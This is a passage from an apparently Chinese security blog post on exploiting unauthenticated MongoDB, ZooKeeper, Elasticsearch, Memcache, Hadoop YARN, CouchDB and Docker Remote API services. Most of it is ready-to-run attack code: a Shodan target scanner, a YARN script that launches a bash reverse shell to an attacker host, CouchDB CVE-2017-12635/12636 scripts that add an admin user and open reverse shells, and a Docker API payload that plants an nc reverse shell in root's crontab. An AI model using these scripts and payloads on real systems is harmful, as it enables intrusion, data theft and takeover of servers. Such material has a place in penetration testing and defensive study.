&apos;:27017&apos;</span><br><span class="line">    try:</span><br><span class="line">        conn = pymongo.MongoClient(ip_addr,27017,socketTimeoutMS=3000)</span><br><span class="line">        dbname = conn.database_names()</span><br><span class="line">        print &quot;success&quot;</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print &quot;error&quot;</span><br><span class="line"></span><br><span class="line">print ipcons   </span><br><span class="line">for ipaddr in ipcons:</span><br><span class="line">    connMon(ipaddr)</span><br><span class="line">    print &quot;=================&quot;</span><br></pre></td></tr></table></figure></p>
<p><em>1.3 shodan扫描脚本</em><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">##!/usr/bin/python</span><br><span class="line">## -*- coding: UTF-8 -*-</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">@Author：joy_nick</span><br><span class="line">@博客：http://byd.dropsec.xyz/</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import shodan</span><br><span class="line">import os</span><br><span class="line">iplist = []</span><br><span class="line">ip_list = []</span><br><span class="line">shodan_ip_list = []</span><br><span class="line">def shodanSearch(keywords):</span><br><span class="line">    SHODAN_API_KEY = &quot;your key&quot;</span><br><span class="line">    api = shodan.Shodan(SHODAN_API_KEY)</span><br><span class="line">    total = 0</span><br><span class="line">    try:</span><br><span class="line">        results = api.search(keywords)</span><br><span class="line">        total = int(results[&apos;total&apos;])</span><br><span class="line">        for result in results[&apos;matches&apos;]:</span><br><span class="line">            ##iplist.append(&#123;&quot;ip&quot;:result[&apos;ip_str&apos;],&quot;country&quot;:result[&apos;location&apos;][&apos;country_name&apos;]&#125;)</span><br><span class="line">            iplist.append(result[&apos;ip_str&apos;])</span><br><span class="line">            for i in range(len(iplist)):</span><br><span class="line">                ip_list = iplist[i].encode(&apos;utf-8&apos;)</span><br><span class="line">                shodan_ip_list.append(ip_list)</span><br><span class="line">                s = &apos;\n&apos;.join(shodan_ip_list)</span><br><span class="line">                with open(&apos;shodan_ip_list.txt&apos;,&apos;w&apos;) as output:</span><br><span class="line">                    output.write(s)</span><br><span class="line">    except shodan.APIError, e:</span><br><span class="line">        print &apos;Error: %s&apos; % e</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    shodanSearch(&apos;redis&apos;)</span><br></pre></td></tr></table></figure></p>
<h1 id="ZooKeeper未授权访问"><a href="#ZooKeeper未授权访问" class="headerlink" title="ZooKeeper未授权访问"></a>ZooKeeper未授权访问</h1><p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。<br><strong>①扫描探测</strong><br>ZooKeeper默认开启在<code>2181</code>端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。<br><code>./zkCli.sh -server 127.0.0.1 2181</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -p2181 -oG zookeeper.gnmap 192.168.1.0/24  </span><br><span class="line">grep &quot;Ports: 2181/open/tcp&quot; zookeeper.gnmap | cut -f 2 -d &apos; &apos; &gt; Live.txt</span><br></pre></td></tr></table></figure></p>
<p><strong>②攻击获取信息</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo stat |ncat 127.0.0.1 2181//stat：列出关于性能和连接的客户端的统计信息。</span><br><span class="line">echo ruok |ncat 127.0.0.1 2181//ruok：测试服务器是否运行在非错误状态。</span><br><span class="line">echo reqs |ncat 127.0.0.1 2181//reqs：列出未完成的请求。</span><br><span class="line">echo envi |ncat 127.0.0.1 2181//envi：打印有关服务环境的详细信息。</span><br><span class="line">echo dump |ncat 127.0.0.1 2181//dump：列出未完成的会话和临时节点。</span><br></pre></td></tr></table></figure></p>
<h1 id="Elasticsearch未授权访问"><a href="#Elasticsearch未授权访问" class="headerlink" title="Elasticsearch未授权访问"></a>Elasticsearch未授权访问</h1><p>ElasticSearch 是一款Java编写的企业级搜索服务，启动此服务默认会开放HTTP-9200端口，可被非法操作数据。<br><strong>熟悉的响应</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl http://127.0.0.1:9200/_cat/indices/</span><br><span class="line">&#123; &quot;status&quot; : 200, &quot;name&quot; : &quot;Flake&quot;, &quot;cluster_name&quot; : &quot;elasticsearch&quot;, &quot;version&quot; : &#123;&quot;number&quot; : &quot;1.4.1&quot;,&quot; &quot;build_hash&quot; : &quot;b88f43fc40b0bcd7f173xxxxx2e97816de80b19&quot;, &quot;build_timestamp&quot; : &quot;2015-07-29T09:54:16Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;4.10.4&quot;&#125;, &quot;tagline&quot; : &quot;You Know, for Search&quot;&#125;</span><br></pre></td></tr></table></figure></p>
<p> <strong>②漏洞测试</strong></p>
<p>安装了river之后可以同步多种数据库数据（包括关系型的mysql、mongodb等）。<br><code>http://localhost:9200/_cat/indices</code> 里面的indices包含了_river一般就是安装了river了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:9200/_plugin/head/    web管理界面</span><br><span class="line">http://localhost:9200/_river/_search  查看数据库敏感信息</span><br><span class="line">http://localhost:9200/_nodes  查看节点数据</span><br></pre></td></tr></table></figure></p>
<h1 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title="Memcache未授权访问"></a>Memcache未授权访问</h1><p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问<br><strong>①扫描探测</strong><br><code>nmap -sV -p 11211 --script memcached-info 0.0.0.0</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">##! /usr/bin/env python</span><br><span class="line">## _*_  coding:utf-8 _*_</span><br><span class="line">def Memcache_check(ip, port=11211, timeout=5):</span><br><span class="line">    try:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, int(port)))</span><br><span class="line">        s.send(&quot;stats\r\n&quot;)</span><br><span class="line">        result = s.recv(1024)</span><br><span class="line">        if &quot;STAT version&quot; in result:</span><br><span class="line">            print &apos;[+] Memcache Unauthorized: &apos; +ip+&apos;:&apos;+str(port)</span><br><span class="line">    except Exception, e:</span><br><span class="line">        pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    Elasticsearch_check(&quot;127.0.0.1&quot;)</span><br></pre></td></tr></table></figure></p>
<p><strong>②攻击利用</strong><br><em>2.1 基础部分</em><br><code>{COMMAND}0x20{ARGUMENT}(LF|CRLF)</code><br>command字段有如下几条命令</p>
<ul>
<li>存储操作(set, add, replace, append, prepend, cas)</li>
<li>检索操作 (get, gets)</li>
<li>删除操作 (delete)</li>
<li>增减操作 (incr, decr)</li>
<li>touch</li>
<li>slabs reassign</li>
<li>slabs automove</li>
<li>lru_crawler</li>
<li>统计操作(stats items, slabs, cachedump)</li>
<li>其他操作 (version, flush_all, quit)</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stats  //查看memcache 服务状态</span><br><span class="line">stats items  //查看所有items</span><br><span class="line">stats cachedump 32 0  //获得缓存key</span><br><span class="line">get :state:264861539228401373:261588   //通过key读取相应value ，获得实际缓存内容，造成敏感信息泄露</span><br></pre></td></tr></table></figure>
<p><em>2.2 建立连接并获取信息</em><br><code>telnet &lt;target&gt; 11211</code>，或<code>nc -vv &lt;target&gt; 11211</code>，无需用户名密码，可以直接连接memcache 服务的11211端口。</p>
<h1 id="Hadoop未授权访问"><a href="#Hadoop未授权访问" class="headerlink" title="Hadoop未授权访问"></a>Hadoop未授权访问</h1><p>Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的 MapReduce 算法进行分布式处理。这个框架被Adobe，Last fm，EBay，Yahoo等知名公司使用着。它极大地精简化程序员进行分布式计算时所需的操作，用户大概通过如下步骤在hadoop中实现分布式处理：</p>
<ul>
<li>用户创建一个处理键值的map函数</li>
<li>产生了一套中间键/值</li>
<li>reduce函数合并中间值并把他们关联到对应的键<br><strong>敏感端口：</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HDFS	NameNode	50070</span><br><span class="line">HDFS	SecondNameNode	50090</span><br><span class="line">HDFS	DataNode	50075</span><br><span class="line">HDFS	Backup/Checkpoint node	50105</span><br><span class="line">MapReduce	JobTracker	50030</span><br><span class="line">MapReduce	TaskTracker	50060</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>通过访问 <code>NameNode WebUI</code> 管理界面的 50070 端口，可以下载任意文件。而且，如果 <code>DataNode</code> 的默认端口 50075 开放，攻击者可以通过 HDSF 提供的 restful API 对 HDFS 存储的数据进行操作。<br> <strong>攻击手法</strong></p>
<p>利用方法和原理中有一些不同。在没有 hadoop client 的情况下，直接通过 <a href="https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html" target="_blank" rel="noopener">REST API</a> 也可以提交任务执行。<br>利用过程如下：</p>
<ul>
<li>在本地监听等待反弹 shell 连接</li>
<li>调用 New Application API 创建 Application</li>
<li>调用 Submit Application API 提交<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">攻击脚本</span><br><span class="line">##!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">target = &apos;http://127.0.0.1:8088/&apos;</span><br><span class="line">lhost = &apos;192.168.0.1&apos; ## put your local host ip here, and listen at port 9999</span><br><span class="line"></span><br><span class="line">url = target + &apos;ws/v1/cluster/apps/new-application&apos;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[&apos;application-id&apos;]</span><br><span class="line">url = target + &apos;ws/v1/cluster/apps&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">    &apos;application-id&apos;: app_id,</span><br><span class="line">    &apos;application-name&apos;: &apos;get-shell&apos;,</span><br><span class="line">    &apos;am-container-spec&apos;: &#123;</span><br><span class="line">        &apos;commands&apos;: &#123;</span><br><span class="line">            &apos;command&apos;: &apos;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&apos; % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &apos;application-type&apos;: &apos;YARN&apos;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h1 id="CouchDB未授权访问"><a href="#CouchDB未授权访问" class="headerlink" title="CouchDB未授权访问"></a>CouchDB未授权访问</h1><p>CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 <code>RESTful JavaScript Object Notation (JSON) API</code> 访问。CouchDB会默认会在<code>5984</code>端口开放Restful的API接口，用于数据库的管理功能。<br>CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[query_servers]</span><br><span class="line">LANGUAGE = PATH ARGS</span><br><span class="line">默认情况下，配置文件中已经设置了两个query_servers:</span><br><span class="line"></span><br><span class="line">[query_servers]</span><br><span class="line">javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js</span><br><span class="line">coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js</span><br></pre></td></tr></table></figure></p>
<p>CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了，在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行(影响版本：小于 1.7.0 以及 小于 2.1.1，该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。)</p>
<p><strong>1.扫描探测</strong><br><code>nmap -p 5984 --script &quot;couchdb-stats.nse&quot; 127.0.0.1</code></p>
<p><strong>2.利用方式</strong><br><em>(1) 1.6.0 下的说明</em></p>
<p>依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#添加一个名字为cmd的query_servers，其值为id &gt;/tmp/success，这就是我们后面待执行的命令。</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd&apos; -d &apos;&quot;id &gt;/tmp/success&quot;&apos;</span><br><span class="line"></span><br><span class="line">#添加一个Database和Document，这里添加了后面才能查询</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest&apos;</span><br><span class="line">curl -X PUT &apos;http://vulhub:vulhub@your-ip:5984/vultest/vul&apos; -d &apos;&#123;&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">#在这个Database里进行查询，因为将language设置为cmd，这里就会用到第一步里添加的名为cmd的query_servers，最后触发命令执行</span><br><span class="line">curl -X POST &apos;http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10&apos; -d &apos;&#123;&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;&#125;&apos; -H &apos;Content-Type:application/json&apos;</span><br></pre></td></tr></table></figure></p>
<p><em>(2) 2.1.0 下的说明</em></p>
<p>2.1.0中修改了上面用到的两个API，Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。带上账号密码访问<code>/_membership</code>即可：<br><figure class="highlight plain"><figcaption><span>http://vulhub:vulhub@your-ip:5984/_membership```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可见，这里只有一个node，名字是nonode@nohost。</span><br><span class="line">然后，修改nonode@nohost的配置：</span><br></pre></td></tr></table></figure></p>
<p>curl -X PUT <a href="http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd" target="_blank" rel="noopener">http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd</a> -d ‘“id &gt;/tmp/success”‘<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">然后，与1.6.0的利用方式相同，先增加一个Database和一个Document：</span><br></pre></td></tr></table></figure></p>
<p>curl -X PUT ‘<a href="http://vulhub:vulhub@your-ip:5984/vultest&#39;" target="_blank" rel="noopener">http://vulhub:vulhub@your-ip:5984/vultest&#39;</a><br>curl -X PUT ‘<a href="http://vulhub:vulhub@your-ip:5984/vultest/vul&#39;" target="_blank" rel="noopener">http://vulhub:vulhub@your-ip:5984/vultest/vul&#39;</a> -d ‘{“_id”:”770895a97726d5ca6d70a22173005c7b”}’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Couchdb 2.x删除了`_temp_view`，为了触发query_servers中定义的命令，需要添加一个_view：</span><br></pre></td></tr></table></figure></p>
<p>curl -X PUT <a href="http://vulhub:vulhub@your-ip:5984/vultest/_design/vul" target="_blank" rel="noopener">http://vulhub:vulhub@your-ip:5984/vultest/_design/vul</a> -d ‘{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’ -H “Content-Type: application/json”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">增加_view的同时即触发了query_servers中的命令。</span><br><span class="line">*2.1 python脚本 支持高低版本,需要在version = 定义*</span><br></pre></td></tr></table></figure></p>
<p>##!/usr/bin/env python3<br>import requests<br>from requests.auth import HTTPBasicAuth</p>
<p>target = ‘<a href="http://127.0.0.1:5984&#39;" target="_blank" rel="noopener">http://127.0.0.1:5984&#39;</a><br>command = ‘“bash -i &gt;&amp; /dev/tcp/192.168.2.64/2222 0&gt;&amp;1”‘<br>version = 2</p>
<p>session = requests.session()<br>session.headers = {<br>    ‘Content-Type’: ‘application/json’<br>}</p>
<h2 id="session-proxies"><a href="#session-proxies" class="headerlink" title="session.proxies = {"></a>session.proxies = {</h2><h2 id="‘http’-‘http-127-0-0-1-8085-39"><a href="#‘http’-‘http-127-0-0-1-8085-39" class="headerlink" title="‘http’: ‘http://127.0.0.1:8085&#39;"></a>‘http’: ‘<a href="http://127.0.0.1:8085&#39;" target="_blank" rel="noopener">http://127.0.0.1:8085&#39;</a></h2><h2 id=""><a href="#" class="headerlink" title="}"></a>}</h2><p>session.put(target + ‘/_users/org.couchdb.user:wooyun’, data=’’’{<br>  “type”: “user”,<br>  “name”: “wooyun”,<br>  “roles”: [“_admin”],<br>  “roles”: [],<br>  “password”: “wooyun”<br>}’’’)</p>
<p>session.auth = HTTPBasicAuth(‘wooyun’, ‘wooyun’)</p>
<p>if version == 1:<br>    session.put(target + (‘/_config/query_servers/cmd’), data=command)<br>else:<br>    host = session.get(target + ‘/_membership’).json()[‘all_nodes’][0]<br>    session.put(target + ‘/_node/{}/_config/query_servers/cmd’.format(host), data=command)</p>
<p>session.put(target + ‘/wooyun’)<br>session.put(target + ‘/wooyun/test’, data=’{“_id”: “wooyuntest”}’)</p>
<p>if version == 1:<br>    session.post(target + ‘/wooyun/_temp_view?limit=10’, data=’{“language”:”cmd”,”map”:””}’)<br>else:<br>    session.put(target + ‘/wooyun/_design/test’, data=’{“_id”:”_design/test”,”views”:{“wooyun”:{“map”:””} },”language”:”cmd”}’)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2.2 bash自动化脚本</span><br></pre></td></tr></table></figure></p>
<p>#couchdb.sh</p>
<p>##!/bin/bash</p>
<p>echo CouchDB getshell - c0debreak - tools.changesec.com<br>echo</p>
<p>if [[ $## -ne 2 ]];then<br>    echo Usage: $0 <a href="http://xx.xx.xx.xx:5984" target="_blank" rel="noopener">http://xx.xx.xx.xx:5984</a> myserver:myport<br>    exit 1<br>else<br>    server=$1<br>    cb=${2/:/\/}<br>fi</p>
<p>function run() {<br>    cmd=$1</p>
<pre><code>curl -XPUT &quot;$server/_config/query_servers/cmd&quot; -d &quot;\&quot;$cmd\&quot;&quot;
curl -XPUT &quot;$server/example&quot;
curl -XPUT &quot;$server/example/record&quot; -d &apos;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&apos;
curl --max-time 1 &quot;$server/example/_temp_view?limit=1&quot; -d &apos;{&quot;language&quot;:&quot;cmd&quot;, &quot;map&quot;:&quot;&quot;}&apos; -H &apos;Content-Type: application/json&apos;
</code></pre><p>}</p>
<p>run “echo ‘/bin/bash -i &gt;&amp; /dev/tcp/$cb 0&gt;&amp;1’ &gt; /tmp/shell”<br>run “bash /tmp/shell”<br>run “rm -f /tmp/shell”</p>
<p>curl -XDELETE “$server/_config/query_servers/cmd”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">用法：</span><br><span class="line">`sh couchdb.sh http://xx.xx.xx.xx:5984 myserver:myport`</span><br><span class="line"></span><br><span class="line"># Docker未授权访问</span><br><span class="line"></span><br><span class="line">**1.基础介绍**</span><br><span class="line">docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，由docker官方提供。</span><br><span class="line"></span><br><span class="line">在使用`docker swarm`的时候，管理的docker 节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page not found ，这是 Docker Remote API，可以执行docker命令，比如访问 `http://host:2375/containers/json`会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps 的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。</span><br><span class="line"></span><br><span class="line">swarm是用来管理docker集群的，应该放在内网。若在公网上的几台机器上安装swarm，并且2375端口的访问策略是开放的，可以直接访问。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*2.利用方法*</span><br><span class="line">随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</span><br></pre></td></tr></table></figure></p>
<p>import docker</p>
<p>client = docker.DockerClient(base_url=’<a href="http://your-ip:2375/&#39;" target="_blank" rel="noopener">http://your-ip:2375/&#39;</a>)<br>data = client.containers.run(‘alpine:latest’, r’’’sh -c “echo ‘<em> </em> <em> </em> * /usr/bin/nc your-ip 21 -e /bin/sh’ &gt;&gt; /tmp/etc/crontabs/root” ‘’’, remove=True, volumes={‘/etc’: {‘bind’: ‘/tmp/etc’, ‘mode’: ‘rw’}})<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入crontab文件，成功反弹shell</span><br><span class="line">**2.2 python脚本**</span><br><span class="line">[https://github.com/Tycx2ry/docker_api_vul](https://github.com/Tycx2ry/docker_api_vul)</span><br></pre></td></tr></table></figure></p>
<p>pip install -r requirements.txt//安装类库</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375//查看运行的容器</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a//查看所有的容器</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l//查看所有镜像</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L//查看端口映射</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹<br>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口//端口写计划任务（centos,redhat等,加-u参数用于ubuntu等）</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k//写sshkey(自行修改脚本的中公钥)</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e “id” -I 容器id//在容器中执行命令</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id//删除容器</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22//修改client api版本</p>
<p>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V//查看服务端api版本<br><code>`</code></p>

      
    </div>

    

    
    
    
    <div>
    
       <div>

    <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>

</div>
    
    </div>

    

    
       
    
    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/数据库及漏洞学习/" rel="tag"># 数据库及漏洞学习</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/05/10/代码审计入门总结/" rel="next" title="代码审计入门总结">
                <i class="fa fa-chevron-left"></i> 代码审计入门总结
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2018/05/12/复现0ctf-login-me-nodejs-mongodb/" rel="prev" title="复现0ctf-login me(nodejs+mongodb)">
                复现0ctf-login me(nodejs+mongodb) <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>


  </div>


          </div>
          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">cws6</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          
            <nav class="site-state motion-element">
              
                <div class="site-state-item site-state-posts">
                
                  <a href="/archives/">
                
                    <span class="site-state-item-count">69</span>
                    <span class="site-state-item-name">posts</span>
                  </a>
                </div>
              

              

              
                
                
                <div class="site-state-item site-state-tags">
                  <a href="/tags/index.html">
                    
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                      
                    
                    <span class="site-state-item-count">8</span>
                    <span class="site-state-item-name">tags</span>
                  </a>
                </div>
              
            </nav>
          

          

          

          

          
          

          
            
          
          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Redis未授权访问"><span class="nav-number">1.</span> <span class="nav-text">Redis未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Jenkins未授权访问"><span class="nav-number">2.</span> <span class="nav-text">Jenkins未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MongoDB未授权访问"><span class="nav-number">3.</span> <span class="nav-text">MongoDB未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ZooKeeper未授权访问"><span class="nav-number">4.</span> <span class="nav-text">ZooKeeper未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Elasticsearch未授权访问"><span class="nav-number">5.</span> <span class="nav-text">Elasticsearch未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Memcache未授权访问"><span class="nav-number">6.</span> <span class="nav-text">Memcache未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hadoop未授权访问"><span class="nav-number">7.</span> <span class="nav-text">Hadoop未授权访问</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CouchDB未授权访问"><span class="nav-number">8.</span> <span class="nav-text">CouchDB未授权访问</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#session-proxies"><span class="nav-number">8.1.</span> <span class="nav-text">session.proxies = {</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#‘http’-‘http-127-0-0-1-8085-39"><span class="nav-number">8.2.</span> <span class="nav-text">‘http’: 